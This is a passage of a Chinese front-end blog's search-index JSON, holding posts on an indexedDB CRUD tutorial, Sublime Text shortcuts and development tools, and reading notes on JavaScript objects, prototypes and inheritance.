class=\"item\"&gt;              &lt;a target=\"_blank\" href=\"{{url}}\"&gt;              &lt;div class=\"search-result-title\"&gt;{{title}}&lt;/div&gt;              &lt;p class=\"search-result search-result-link\"&gt;{{content}}&lt;/p&gt;              &lt;/a&gt;            &lt;/li&gt;          `;          },          keyWordTpl() {            return `&lt;b class=\"search-keyword\"&gt;{{searchText}}&lt;/b&gt;`          }        }      searchMod.init(Jinput)    &lt;/script&gt;  &lt;/div&gt;&lt;/article&gt;","url":"/2020/08/01/hexo-site-search-mod/","link":"","plink":"https://thinkerchan.com/2020/08/01/hexo-site-search-mod/"},{"title":"【快速教程】Web离线存储之indexedDB","content":"前言&lt;Javascript高级程序设计&gt;第23章的时候是介绍过indexedDB的, 今天单独把它重新写一遍. 后续给出的代码, 基本能够满足大部分人开发使用了.\n为什么只写indexedDB? 我们可以打开chrome浏览器的控制台, 可以看到除了indexedDB实际上还有一种本地数据库方案 - Web SQL(它的语句和主流数据库操作语句没什么区别, 意味着前端还要另外学习sql语句), 但是Web SQL已经明确被放弃了, 所以indexedDB的存在是为了代替它.\nindexedDB的思想是创建一套API, 方便保存和读取JS对象, 同时支持查询搜索. 这样的API设计, 能让前端开发者以更前端的方式进行对接.\n实例通常我们操作传统数据库的时候是这么做的:\n\n创建数据库 -&gt; 创建表 -&gt; 操作数据\n\n而indexedDB有一点不一样的地方, 它并不是创建表, 而是创建一个叫做对象存储空间的对象(当然你也可以按照传统方式那么理解, 并无大碍).\n看示例 , 你也可以点击这里运行下面的代码:\n&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;indexedDB教程&lt;/title&gt;  &lt;style&gt;    table{border-collapse:collapse;}    th,td{min-width:150px;text-align:center;}    .red{color:#FFF;background-color:#F00;}  &lt;/style&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1&gt;indexedDB快速教程-实现增删查改&lt;/h1&gt;  &lt;p&gt;&lt;a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API\"&gt;MDN indexedDB API&lt;/a&gt;&lt;/p&gt;  &lt;input type=\"text\" id=\"Juser\" placeholder=\"姓名\"&gt;  &lt;input type=\"text\" id=\"Jphone\" placeholder=\"电话\"&gt;  &lt;button id=\"Jadd\"&gt;增加&lt;/button&gt;  &lt;button id=\"Jdel\"&gt;删除数据库&lt;/button&gt;  &lt;br&gt;  &lt;input type=\"text\" id=\"JsearchTxt\" placeholder=\"查询\"&gt;  &lt;button id=\"Jsearch\"&gt;点击查询&lt;/button&gt;  &lt;br&gt;  &lt;table border=\"1\"&gt;    &lt;thead&gt;      &lt;tr&gt;        &lt;th&gt;姓名&lt;/th&gt;        &lt;th&gt;电话&lt;/th&gt;        &lt;th&gt;操作&lt;/th&gt;      &lt;/tr&gt;    &lt;/thead&gt;    &lt;tbody id=\"Jtbd\"&gt;&lt;/tbody&gt;  &lt;/table&gt;  &lt;script&gt;    let index = {      config:{        dbName:'demo',        tbName:'tb',        dbVersion:1,   //只有在修改数据表的字段的时候才需要更新版本      },      init(){        const C = this.config;        let _this = this;        // 1.创建数据库        let IDBRequest = window.indexedDB.open(C.dbName,C.dbVersion);        /*          返回的IDBRequest对象有以下方法:          1.onblocked          2.onerror          3.onsuccess          4.onupgradeneeded: 优先级比 onsuccess 更高         */        // 2.创建对象存储空间 - 你可以理解成创建数据库的\"表\"        IDBRequest.onupgradeneeded = (e)=&gt;{          var _db = e.target.result;          // 如果不存在某个\"表\"就创建          if (!_db.objectStoreNames.contains(C.tbName)) {            let objectStore = _db.createObjectStore(C.tbName,{              keyPath:'id',              autoIncrement: true            })            // 创建可以被索引的字段            objectStore.createIndex(\"user\", \"user\", { unique: false });            objectStore.createIndex(\"phone\", \"phone\", { unique: false });          }        }        IDBRequest.onsuccess = (e)=&gt;{          // e.target == IDBRequest; //true          let db = e.target.result;          _this.db = db;          _this.renderAll(db); //展示数据库存储的数据        }        IDBRequest.onerror = (e)=&gt;{          // e.target == IDBRequest; //true          console.log(e.target.errorCode);        }      },      tpl(obj){        if (!!Object.keys(obj).length) {          let tpl = `            &lt;tr id=\"Jtr${obj.id}\"&gt;              &lt;td data-key=\"user\"&gt;${obj.user}&lt;/td&gt;              &lt;td data-key=\"phone\"&gt;${obj.phone}&lt;/td&gt;              &lt;td class=\"btns\"&gt;                &lt;button class=\"del\" data-type=\"del\" data-id=\"${obj.id}\" &gt;删除&lt;/button&gt;                &lt;button class=\"modify\" data-type=\"modify\" data-id=\"${obj.id}\" data-open=\"0\"&gt;修改&lt;/button&gt;              &lt;/td&gt;            &lt;/tr&gt;          `          return tpl;        }else{          return '';        }      },      renderOne(obj){        let tpl = this.tpl(obj);        Jtbd.insertAdjacentHTML('beforeend', tpl);      },      renderAll(db){        const C = this.config;        let _this = this;        if (db.objectStoreNames.contains(C.tbName)) {          // 开始处理数据          let transaction = db.transaction([C.tbName], \"readwrite\");          // transaction对象也有下面两个方法:          // transaction.oncomplete = (e)=&gt;{          //   console.log('transaction.oncomplete')          // }          // transaction.onerror = (e)=&gt;{          //   console.log('transaction.onerror')          // }          // 获取\"表\"里的数据          let objectStore = transaction.objectStore(C.tbName);          let html = '';          // 遍历\"表\"里面的数据          objectStore.openCursor().onsuccess = (e)=&gt; {            let cursor = e.target.result;            if (cursor) {              html = html + _this.tpl(cursor.value)              cursor.continue();            }else{              Jtbd.innerHTML = html;            }          }        }      }    }    let handler = {      add(obj){  //增        const C = index.config;        // 凡是要修改数据库, 都需要\"告诉\"数据库: 我要进行\"transaction\"(操作)了.        let transaction = index.db.transaction([C.tbName], \"readwrite\");        let objectStore = transaction.objectStore(C.tbName);        let addRequest = objectStore.add(obj);  //直接存储js对象就可以了        addRequest.onsuccess = (e)=&gt; {          //存进去之后, 还要获取id用于标记html元素          let id = e.target.result;          index.renderOne({            id:id,            user:Juser.value,            phone:Jphone.value          })        }      },      del(id,cb){ // 删        const C = index.config;        let transaction = index.db.transaction([C.tbName], \"readwrite\");        let objectStore = transaction.objectStore(C.tbName);        let _id = parseInt(id);        let rmRequest = objectStore.delete(_id);        rmRequest.onsuccess = (e)=&gt;{          console.log('删除完毕')          cb &amp;&amp; cb();        }        rmRequest.onerror = (e)=&gt;{          console.log('删除失败')        }      },      search(str){  // 查        const C = index.config;        let transaction = index.db.transaction([C.tbName], \"readwrite\");        let objectStore = transaction.objectStore(C.tbName);        // IDBKeyRange可以理解成一个生成查找范围的对象 有 only/bound/lowerBound/upperBound等几个方法        let bound = IDBKeyRange.only(str);        let html = '';        // 前面创建了两个可以被索引的字段 user/phone, 这里我们查找user        objectStore.index('user').openCursor(bound).onsuccess = (e)=&gt;{          let cursor = e.target.result;          if (cursor) {            html = html + index.tpl(cursor.value)            cursor.continue();          }else{            Jtbd.innerHTML = html;          }        }      },      modify(id,obj){   // 改        const C = index.config;        let transaction = index.db.transaction([C.tbName], \"readwrite\");        let objectStore = transaction.objectStore(C.tbName);        let _id = parseInt(id);        let modifyRequest = objectStore.get(_id);        modifyRequest.onsuccess = (e)=&gt;{          let res = e.target.result;          for (let key in obj) {            if (typeof res[key] != 'undefined') {              res[key] = obj[key];            }          }          objectStore.put(res);        }      }    }    index.init();    Jadd.addEventListener('click', function(e) {      let data = {        user:Juser.value,        phone:Jphone.value      };      handler.add(data);    }, false)    Jtbd.addEventListener('click', function(e) {      let curEle =  e.target      let id = curEle.dataset.id;      if (!!id) {        let type = curEle.dataset.type;        switch (type) {          case 'del':            handler.del(id,function(){              let rmNode = document.getElementById('Jtr'+id);              Jtbd.removeChild(rmNode);            })            break;          case 'modify':            let isOpen = curEle.dataset.open=='1';            let tr = document.getElementById('Jtr'+id);            let tds = [].slice.call(tr.children);            if (isOpen) {              // 更新数据              curEle.innerHTML = '修改'              curEle.dataset.open = '0';              curEle.classList.remove('red');              // 声明一个变量存储修改后的数据              let data = {};              for (let i = 0,len = tds.length-1; i &lt; len; i++) {                let td = tds[i];                data[td.dataset.key] = td.innerText;                td.removeAttribute('contenteditable');              }              handler.modify(id,data);            }else{              //  打开编辑状态              curEle.innerHTML = '保存'              curEle.dataset.open = '1';              curEle.classList.add('red');              for (let i = 0,len = tds.length-1; i &lt; len; i++) {                let td = tds[i];                td.setAttribute('contenteditable', true)              }            }            break;          default:            // ...            break;        }      }    }, false)    Jsearch.addEventListener('click', function(e) {      let str = JsearchTxt.value.trim();      if (!!str) {        Jtbd.innerHTML = '';        handler.search(str);      }else{        alert('输入非空字符查找!');      }    }, false)    Jdel.addEventListener('click', function(){      index.db.close(); //记得要关闭数据库才能删除, 否侧下列事件不会被触发      let destoryRequest = window.indexedDB.deleteDatabase(index.config.dbName);      destoryRequest.onerror = function(event) {        console.log(\"Error deleting database.\");      };      destoryRequest.onsuccess = function(event) {        console.log(\"Database deleted successfully\");      };    },false)  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","url":"/2019/04/12/indexeddb-quick/","link":"","plink":"https://thinkerchan.com/2019/04/12/indexeddb-quick/"},{"title":"前端开发工具","content":"Fe-Dev-In-Mac ossublime text\n这是我在mac下常操作的….  windows 下状况类似 ,  大家多试试就OK了…基本一样的\n\n必备快捷键\ncmd+shift+k  选中标签对 可以快速替换\ncmd+d 选中标签\ncmd+k 跳过标签\ncmd+u 动作回退(注意是动作回退,包括撤销)\ncmd+g 选下一个(前提是你已经查找过这个字符串)\ncmd+shift+g 选前一个(前提是你已经查找过这个字符串 如已经使用过cmd+d || cmd+f)\ncmd+ctrl+g 选择所有相同字符串\ncmd+shift+v 自动缩进的粘贴\ncmd+shift+Y css简单计算(这个简直方便)\ncmd+shift+A html向外选择\nctrl+shift+M js向外选择\ncmd+P 简直神级查找 默认快速在左侧所有文件树中搜索文件,配合 @/#/: 三种符号使用简直感人\ncmd+T 同上\ncmd+R html查找id,函数/js查找函数/css查找class/md查找标题(h1-h6)\ncmd+shift+D 复制粘贴当前行\ncmd+ctrl+↑ / ↓  讲当前行上移或者下移\ncmd+J 没啥用(合并一行)\ncmd+L  选中当前行 , 多用于删除\ncmd+shift+L  先选中文本, 打散光标\nctrl+shift+k 删除当前行\nctrl+T 交换位置\nctrl+m 定位成对的括号/花括号/方括号\nctrl+tab 最后两个文件位置切换\nctrl+k 删除光标前的部分\ncmd+delete 删除光标前的部分\ncmd+shift+[ 前一个tab\ncmd+shift+] 后一个tab\ncmd+T 搜索所有的文件\ncmd+enter 下一行插入空行\ncmd+shift+enter 上一行插入空行\nctrl+option+enter  多用于选中插入/emmet效果(sublime最强大的快捷键组合)\nopt+cmd+F 配合”auto_find_in_selection”: true 用于局部快速替换\n\n命令模式\nfile 命令 // 重命名 增删文件 打开文件夹等等….\n\n必备插件\nPackage Control\nEmmet\nHTMLAttributes\nEmmet Css Snippets\nJquery\nSass/Scss/Sass Snippets  // 都装上…\nAlignment\nConvertToUTF8 //支持gbk\n等等….\n\n推荐插件\nBracket Highlighter //高亮\nDocBlockr   //写好函数之后写注释\nIMESupport  // 输入法跟随(解决windows下中文输入法不跟随光标)\nLiveStyle //  chrome 控制台修改本地css文件\nSideBarEnhancements // 侧边栏增强\nclickable URLs  // 文档url可点击\nCsscomb // css排版(配置)\nTerminal  // 终端打开插件 定义快捷键\nTrimmer // 去空格去空行\nAutoFileName  //方便\nAutoprefixer  //自动前缀\nAdvancedNewFile //快速创建文件夹/文件 opt+cmd+n\nSublimeTmpl   //模板插件 ctrl+opt+type\nMarkdown Preview // md插件\ncolor Highlighter //css颜色\nHTML-CSS-JS Prettify  // 不解释\nFileDiffs   // 查看文件改动\nQuoteHTML   // Html转js字符串\n\n设置快捷键\nreindent //设置快捷键自动缩进文档preferences -&gt; 按键绑定-用户 -&gt; 填入Json [{ “keys”: [“ctrl+i”], “command”: “reindent” }]  -&gt; 全选之后按ctrl+i 排版妥妥的\n\n配置Trimmer的删除行末/空行快捷键\n\n\n用户自定义设置\n“word_separators”: “./\\()\\”‘:,.;&lt;&gt;~!@#$%^&amp;*|+=[]{}`~?” //  其实就是去掉了横杠 “-“ 方便选择 a-b 这样的结构 , 当然你们可以按需增删里面的符号\n“spell_check”:true    // 检查拼写(我相信你们肯定踩过拼写错误找了很久都没找出来的坑….)\n\n其他技巧\n多文件查找按Command + Shift + F在Find框中输入待查找的代码。可按Command + E快速使用选择中的代码段。在Where框中指定需要查找的文件范围，或填写&lt; open files &gt;表示查找目前打开的文件。在Replace框中输入要替换成的代码，按Replace按钮批量替换\n\nspace 还是 tab ?\n\n 设置宏, 新建xxx.sublime-macro，保存在Packages/Users/里面, 在 Preferences 里面找到 Key Bindings - User , { “keys”: [“ctrl+alt+i”], “command”: “run_macro_file”, “args”: {“file”: “Packages/User/xxx.sublime-macro”} }\n\n\n保存常用代码片段\n\n\nnode相关\nnodejs //不解释\ngrunt/gulp/fis // 自动化工具(这里可以开一个教程…)\nbrowser-sync // 神级调试工具\nanywhere // 文件夹随时随地变服务器\nyeoman // 脚手架工具(这里可以开一个教程…)\n\n终端相关\nTerminal // sublime text 的插件, 方便打开当前文件所在文件夹的路径终端\niTerm2 // mac终端替代品\n\n如果sublime里面装了Terminal插件的话 记得在 在Terminal用户配置中改成 {“terminal”: “iTerm.sh”}\n\n\nGo2Shell // 配置在finder中的终端打开工具\n\n\n设计相关\nPhotoshop CC // 不解释\nmarkman // 标尺 取色工具 psd 不复杂 用这个就可以搞定\ncutterman //http://www.cutterman.cn/v2/cutterman 切图神器\nsip // 取色工具  链接: http://pan.baidu.com/s/1kUywjLd 密码: 4ccc\n\nchrome插件\n梧桐雨工具箱 // 链接: http://pan.baidu.com/s/1bos6PDt 密码: pkmz\nFE助手 //链接: http://pan.baidu.com/s/1qWXN9aG 密码: qmw5\nAnything to QRcode // 链接: http://pan.baidu.com/s/1bnOeE8v 密码: hy3h\nEmmet-liveStyle // 方便到令人发指的神器 (请使用最新版,sublime text也要安装对应插件) 链接: http://pan.baidu.com/s/1jHajuz8 密码: bmhq\nYSlow // 网站优化\n马克飞象 // markdwon编辑器\n\n系统工具(mac os app)\nDash // 文档集合\nFlashlight // 搜索\nAlferd // 搜索\nMou // markdown编辑器\nBetterTouchTool // 自定义触控板(强烈推荐) 链接http://pan.baidu.com/s/1c0WkjtQ 密码: 368k\nDivvy //分屏工具  链接: http://pan.baidu.com/s/1eQSIslc 密码: huwp\nliceCap //录屏软件\n…其他欢迎补充\n\nFe-Dev-In-Windowssublime text (只给出了快捷键, 其余部分参考mac部分描述)必备快捷键\nctrl+d 选中标签\nctrl+k 跳过标签\nctrl+g 跳到某一行\nctrl+shift+v 自动缩进的粘贴\nctrl+shift+Y css简单计算(这个简直方便)\nctrl+shift+A html向外选择\nctrl+P 简直神级查找 默认快速在左侧所有文件树中搜索文件,配合 @/#/: 三种符号使用简直感人\nctrl+R html查找id,函数/js查找函数/css查找class/md查找标题(h1-h6)\nctrl+shift+D 复制粘贴当前行\nctrl+shift+↑ / ↓  讲当前行上移或者下移\nctrl+ ↑ / ↓ 数字增减\nctrl+J 可能会写数组的时候有用(合并一行)\nctrl+L  选中当前行 , 多用于删除\nctrl+shift+L  先选中文本, 打散光标\nctrl+shift+k 删除当前行\nctrl+T 选中交换位置\nctrl+m 定位成对的括号/花括号/方括号\nctrl+tab 最后两个文件位置切换\nshfit+ delete 删除光标前的部分\nctrl+shift+delete 删除光标后的部分\nctrl+pageUp 前一个tab\nctrl+pageDown 后一个tab\nctrl+enter 下一行插入空行\nctrl+shift+enter 上一行插入空行\nctrl+alt+enter  多用于选中插入/emmet效果(sublime最强大的快捷键组合)\nctrl+shift+g 光标所在区域 加包裹层\nctrl+H 配合”auto_find_in_selection”: true 用于局部快速替换\nctrl+shift+F 强大的搜索和替换\n\nnode相关 (见mac部分)\n略\n\n设计相关\nPhotoshop //公司电脑根本没法选择 ╮(╯▽╰)╭\nmarkman //不解释\ncutterman //http://www.cutterman.cn/v2/cutterman 切图神器\n小吸管 // 非常非常小的取色工具  链接: http://pan.baidu.com/s/1pKytCxX 密码: ryqh\n\nchrome插件 (见mac部分)\n略\n\n其他工具(Windows)\nGifCam // 非常非常好用的gif录制软件 链接: http://pan.baidu.com/s/1eRjcODG 密码: qfkf\nfiddler // 代理抓包工具\nweinre  // 移动端调试工具\n…其他欢迎补充\n\n其他查阅类型(网站)\nhttp://docs.w3cub.com/ //文档集合(英文)\nhttp://tool.oschina.net/apidocs //文档集合(在线)\nhttp://hemin.cn/jq/   // 这人整理的jq api很出名….\nhttp://caniuse.com/   // 这个有终端方式 , 但我比较喜欢网页\nhttp://fontfamily.io/  // 系统字体查询\nhttp://screensiz.es/phone // 设备查询\nhttp://mydevice.io/devices/ // 设备查询\nhttp://www.atool.org/ //这里啥工具都有….\nhttp://f2er.club/ // 前端相关\n还有太多太多…….\n\nchrome插件下载墙内用户请点击: http://www.crx4chrome.com/","url":"/2015/12/25/sublime-skill/","link":"","plink":"https://thinkerchan.com/2015/12/25/sublime-skill/"},{"title":"JS红皮书读书笔记-06-面向对象","content":"理解对象第五讲里面讲了对象声明的两种方式: \n\n使用Object构造函数\n对象字面量\n\n属性类型ES5描述对象属性(property)的特征, 称为特性(attribute), 定义特性是为了实现js引擎用的, 所以在JS中不能直接访问它们(特性). 为了表示特性是内部值, 规范把它们放在两个方括号之中.\nES5有两种属性:\n1. 数据属性:\n数据属性包含一个数据值的位置。在这个位置可以读取和写入值。数据属性有 4 个描述其行为的特性。\n\n[[Configurable]]: 表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性。默认值: true\n[[Enumerable]]: 可枚举, 即能否for-in循环出这个属性, 默认值: true\n[[Writable]]: 是否能改属性的值, 默认值:true\n[[Value]]: 默认值: undefined\n\n为了帮助理解, 我们来看一个例子:\nva person = {}; Object.defineProperty(person, \"name\", {  writable: false,   value: \"Nicholas\",  configurable: false,  //禁止删除});// 注意这个配置只能用一次,否则会报错Object.defineProperty(person, \"name\", {    writable: true, // Cannot redefine property:})alert(person.name); //\"Nicholas\" person.name = \"Greg\"; //非严格模式下赋值被忽略, 严格模式下报错alert(person.name);  //\"Nicholas\"delete person.name; //严格模式下报错alert(person.name);  //\"Nicholas\"\n如果运行Object.defineProperty方法时, 不明确指定的话, configurable, enumerable, writable的值都会变成false(要记住原本他们都是true).\n\n注意: 笔者写本文的时候(2019年), 亲自写示例测试, 书上的这部分话已经不可信.\n\n 2. 访问器属性\n访问器属性不包含数据值；它们包含一对儿 getter 和 setter 函数（不过，这两个函数都不是必需的）。在读取访问器属性时，会调用 getter 函数，这个函数负责返回有效的值；在写入访问器属性时，会调用setter 函数并传入新值，这个函数负责决定如何处理数据。访问器属性有如下 4 个特性:\n\n[[Configurable]]:同数据属性\n[[Enumerable]]: 同数据属性\n[[Get]]: 读取属性时候调用的函数, 默认undefined \n[[Set]]: 写入属性时候调用的函数, 默认undefined \n\n要修改访问器属性的特性, 同样是用Object.defineProperty方法\n我们看这个例子:\nvar demo = {};Object.defineProperty(demo, 'name', {  configurable:true,  enumerable:true,  get:function(){    console.log('我读取了属性')  },  set:function(){    console.log('我设置了属性')  }})\n定义多个属性定义多个属性可以用Object.defineProperties方法, 用法和Object.defineProperty类似, 只不过第二个参数为复合对象\n读取属性的特性用Object.getOwnPropertyDescriptor读取属性的特性\nvar book = {};Object.defineProperties(book, {  _year: {    value: 2004  },  edition: {    value: 1  },  year: {    get: function(){ return this._year;    },    set: function(newValue){       if (newValue &gt; 2004) {        this._year = newValue;        this.edition += newValue - 2004;      }    }  }});var descriptor = Object.getOwnPropertyDescriptor(book, \"_year\"); alert(descriptor.value); //2004 alert(descriptor.configurable); //falsealert(typeof descriptor.get); //\"undefined\"var descriptor = Object.getOwnPropertyDescriptor(book, \"year\"); alert(descriptor.value);  //undefined alert(descriptor.enumerable); //falsealert(typeof descriptor.get); //\"function\"\n创建对象为了解决多次生成对象的问题, 形成了以下常见的接种封装模式\n工厂模式function createPerson(name, age, job){   var o = new Object();  o.name = name;   o.age = age;  o.job = job;  o.sayName = function(){     alert(this.name);  };  return o;}var person1 = createPerson(\"Nicholas\", 29, \"Software Engineer\"); var person2 = createPerson(\"Greg\", 27, \"Doctor\");\n工厂模式解决了生成多个类似对象的问题, 但是还没有解决对象属于什么”类”的问题\n构造函数模式function Person(name, age, job){   this.name = name;  this.age = age;   this.job = job;  this.sayName = function(){     alert(this.name);  };}var person1 = new Person(\"Nicholas\", 29, \"Software Engineer\"); var person2 = new Person(\"Greg\", 27, \"Doctor\");\n我们通常把构造函数的函数名首字母大写, 这样它看起来想一个”类”, 区别于工厂模式, 构造函数模式有三个不同点:\n\n没有显示地创建对象\n直接将数学和方法赋给this\n没有return\n\n创建一个实例的方式变成了 new Person, 背后产生了以下几个步骤:\n\n创建一个新对象\n将构造函数的作用域赋给新对象（因此 this 就指向了这个新对象）；\n执行构造函数中的代码（为这个新对象添加属性）；\n返回新对象\n\n\n构造函数的优点:\n构造函数的好处在于, 它可以作为一种自定义的”类”, 也容易识别实例是否为某一种类型:\nalert(person1.constructor == Person); //truealert(person2.constructor == Person); //true\n注意, 创建Person的实例的时候必须用new关键字, 否则创建的示例会挂载到window上.\n\n构造函数的缺点:\n还是用上一个例子, 但是我们稍作修改:\nfunction Person(name, age, job){   this.name = name;  this.age = age;   this.job = job;  this.sayName = new Function('alert(this.name)'); //为了方便理解我们使用new Function  //这样每次创建Person实例的时候, sayName都是重复创建具有一样功能的方法(即资源浪费)}var p1 = new Person('k',18,'fe');var p2 = new Person('x',19,'bd');p1.sayName == p2.sayName; //false\n\n前面我知道了函数名其实就是一个指针, 那么我们可以稍微改造一下:\nfunction Person(name, age, job){   this.name = name;  this.age = age;   this.job = job;  this.sayName = sayName;}function sayName(){  alert(this.name)}var p1 = new Person('k',18,'fe');var p2 = new Person('x',19,'bd');p1.sayName == p2.sayName; //true\n这样, 看起来也没什么问题了. 不过sayName作为一个全局函数, 只能给Person的示例调用, 好像又对不起它作为全局函数的称号, 如果要定义很多个方法, 那就需要很多个全局函数, 这样看起来又不像”封装好”的样子.\n原型模式为了解决构造函数模式的问题, 诞生了原型模式, 第五章我们提到了Function的每个实例都有两个属性, 一个是length, 另一个是prototype, 我们现在来着重讲这个prototype. prototype其实是一个指针, 指向一个对象, 这个对象用于存储所有实例共享的属性和方法.\n我们先看一张图:\n\n可以看到我随便创造的一个空函数demo, 它的prototype指向了一个对象, 这个对象包含了constructor和__proto__两个属性, 而constructor又指回了demo本身, __proto__指向的是Object, 实际上这个Object, 就是我们常常看到的 new Object里面的那个Object构造函数, 这侧面反映了几个事实:\n\n所有对象都是Object的实例(这个讲原型链的时候会继续深入讲解)\n一个对象可以通过__proto__访问生成这个对象的构造函数 的 原型\n原型(prototype)的constructor属性,指向的是构造函数本身\n\n\n我们再看这个例子:\nfunction Person(){ }Person.prototype.name = \"Nicholas\"; Person.prototype.age = 29; Person.prototype.job = \"Software Engineer\"; Person.prototype.sayName = function(){  alert(this.name);};var person1 = new Person(); person1.sayName();  //\"Nicholas\"var person2 = new Person();person2.sayName();  //\"Nicholas\" alert(person1.sayName == person2.sayName); //true\n实际上它的原理如下:\n\n图中实例的[[prototype]], 其实就是__proto__;\n除了用这个属性确定对象实例和原型的关系, 还可以通过下列方式查看:\nPerson.prototype.isPrototypeOf(person1) //trueObject.getPrototypeOf(person1) == Person.prototype //true\n前面给出的例子, 构造函数都是一个空函数, 不存在任何的属性和方法. 基于上一个代码示例, 我们尝试通过实例重写原型的属性.\nalert(person1.name);  // \"Nicholas\"person1.name = \"kkk\";   //注意我这里只是改了实例的属性, 并没有改构造函数alert(person1.name);  //\"kkk\"alert(person2.name);  // \"Nicholas\"\n可以看出, 通过实例去改变原型, 是没办法在原型中改变对应的属性或者方法.\n从上面的代码能反映出, 对象实例查找某一个属性(或者方法), 是先查找构造函数中的同名属性 , 如果找到则停止, 否则继续在原型中查找同名属性.\n\n解释: 上面的代码是显式地person1.name = “kkk”. 假如构造函数中存在this.name=”kkk”, 那么person1.name的值毫无疑问就是”kkk”;\n\n由于构造函数和原型的这种特性, 我们要查找一个对象实例的属性究竟来自自身还是来自原型, 需要用hasOwnProperty方法:\nalert(person1.hasOwnProperty('name'));  //true\n\nin:通常我们会在for-in(当然ES5可以用Object.keys)中看到in操作符, 用于遍历一个对象的所有课枚举属性, 然而单独使用in操作符的时候, 是用于检测某个对象的某个属性(或方法)是否存在于原型链中. 只要原型中存在需要查找的属性, 假设这个属性为name, 那么不管构造函数是否存在name, in操作符依然能查找出来.\n为了查找只存在原型上的属性(或方法), 我们可以将in和hasOwnProperty写成一个函数用于检测: \nfunction hasPrototypeProperty(object, name){  return !object.hasOwnProperty(name) &amp;&amp; (name in object);}\n\n简写原型:\n前面的代码可以看到, 每添加一个属性, 就要多书写Person.prototype一次, 实际上们可以这样:\nfunction Person(){}Person.prototype = {  constructor:Person, //注意这里要手动绑定构造函数,因为此时的原型相当于一个新领养的小孩, 要重新让他认爹. 虽然我们大多数情况下用不到constructor属性, 但是建议养成这个习惯}\n\n原型的动态:\n由于在原型中查找值的过程是一次搜索，因此我们对原型对象所做的任何修改都能够立即从实例上反映出来 即使是先创建了实例后修改原型也照样如此。\n请看例子:\nvar friend = new Person(); Person.prototype.sayHi = function(){  alert(\"hi\");};friend.sayHi(); //\"hi\"（没有问题！）\n如果生成实例之后用字面量的形式修改了原型对象, 那么就会报错:\nfunction Person(){}var friend = new Person();Person.prototype = {   constructor: Person,   name : \"Nicholas\",   age : 29,  job : \"Software Engineer\",   sayName : function () {    alert(this.name);  }};friend.sayName(); //error. 因为friend是原本那个原型衍生而来的\n\n原生对象的原型: Array, Object, Function同样可以通过上述方式修改原型对象, 不过除非必要, 不建议修改.\n\n原型模式的缺点:所有属性和方法都写在原型, 看上去实现了共享. 但是如果原型对象中的属性是引用类型的话, 实例对改属性的修改, 也会立刻反映到所有实例上.\n看例子:\nfunction Person(){ }Person.prototype = {   constructor: Person,  name : \"Nicholas\",  age : 29,  job : \"Software Engineer\",  friends : [\"Shelby\",\"Court\"],  sayName : function () {    alert(this.name);  }};var person1 = new Person(); var person2 = new Person();person1.friends.push(\"Van\");alert(person1.friends); //\"Shelby,Court,Van\" alert(person2.friends);  //\"Shelby,Court,Van\" alert(person1.friends === person2.friends); //true\n构造函数+原型模式仅仅只用构造函数, 那么在生成对象方法的时候会造成资源浪费. 如果只是用原型模式的话, 那么会产生属性为引用类型时候的弊端. 所以我们可以把这两张方式结合起来:\nfunction Person(name,age, job){  this.name = name;  this.age = age;  this.job = job;  this.friends = [\"Shelby\",\"Court\"],}Person.prototype = {   constructor: Person,  sayName : function () {    alert(this.name);  }};var person1 = new Person(\"Nicholas\", 29, \"Software Engineer\"); var person2 = new Person(\"Greg\", 27, \"Doctor\");person1.friends.push(\"Van\"); alert(person1.friends); //\"Shelby,Count,Van\"alert(person2.friends); //\"Shelby,Count\"\n这样, 组合模式基本解决所有的需求.\n动态原型模式组合模式的优化:\nfunction Person(name,age, job){  this.name = name;  this.age = age;  this.job = job;  this.friends = [\"Shelby\",\"Court\"],  // 看起来更像是一个'类'  if (typeof this.sayName != \"function\"){    Person.prototype.sayName = function(){       alert(this.name);    };  }}\n寄生构造函数假如你有这么一个这样的需求: 批量生产某一种数据类型, 比如数组实例, 但是这个数组实例又有一个toPipedString方法, 那你可以考虑用寄生构造函数.\n它和工厂模式长得很像(实际上就是一样的, 该有的缺点都有):\nfunction _Array(){    var values = new Array();    values.push.apply(values, arguments);    values.toPipedString = function(){        return this.join(\"|\");    }    return values;}var a = new _Array(2,6,8,9,4);a.toPipedString();var b = _Array(2,6,8,9,4);// 这里没有用new , 返回的结果依旧一样(就是工厂模式)b.toPipedString();\n\n在上面的_Array构造函数, 并没有使用到this, 而且它还有显式的return, 也就是说new了也是白new. 虽然书上给出了这个寄生构造函数模式, 但笔者认为实在没有必要使用这种方式.\n\n稳妥构造函数就是寄生构造函数模式下, 只暴露方法, 不允许通过对象实例直接访问对象的属性值\n继承JS只有实现继承, 并且主要依靠原型链实现的.\n原型链前面我们讲了原型, 至于原型链. 实际就是用父类的实例, 作为子类的原型对象(即用父类实例重写子类原型对象), 这样父类拥有的属性和方法, 子类实例自然也能访问到.\n原型链需要注意:\nfunction SuperType(){   this.property = true;}SuperType.prototype.getSuperValue = function(){   return this.property;};function SubType(){   this.subproperty = false;}//继承了 SuperTypeSubType.prototype = new SuperType();//注意以下操作一点要在继承完之后才能执行, 并且不能用字面量添加方法, 否则会导致继承失效.//添加新方法SubType.prototype.getSubValue = function (){   return this.subproperty;};//重写超类型中的方法SubType.prototype.getSuperValue = function (){  return false;};var instance = new SubType(); alert(instance.getSuperValue());  //false\n除了以上要注意的地方, 原型链继承还有两个问题:\n\n第一个问题就是, 当父类的实例包含了引用类型属性时, 子类的原型对象就同样包含了这个引用类型的属性.我们来看示例:\n\nfunction SuperType(){  this.colors = [\"red\", \"blue\", \"green\"];}function SubType(){ }SubType.prototype = new SuperType();var instance1 = new SubType(); instance1.colors.push(\"black\"); alert(instance1.colors);  //\"red,blue,green,black\"var instance2 = new SubType(); alert(instance2.colors); //\"red,blue,green,black\", 已经发生修改\n\n第二个问题: 不能向父类传参.\n\n借用构造函数为了解决原型链继承问题, 我们可以借用父类构造函数, 而不是将父类实力重写子类原型对象 , 通常这种方式叫做经典继承或者伪造继承.\nfunction SuperType(name){  this.name = name;  this.colors = [\"red\", \"blue\", \"green\"];}function SubType(name){  var name = name || 'testdog'  SuperType.call(this,name);  //想起call和apply的作用吗?}var instance1 = new SubType(); instance1.colors.push(\"black\"); alert(instance1.colors); //\"red,blue,green,black\"var instance2 = new SubType(); alert(instance2.colors); //\"red,blue,green\"var instance = new subType('kkk')instance.name;  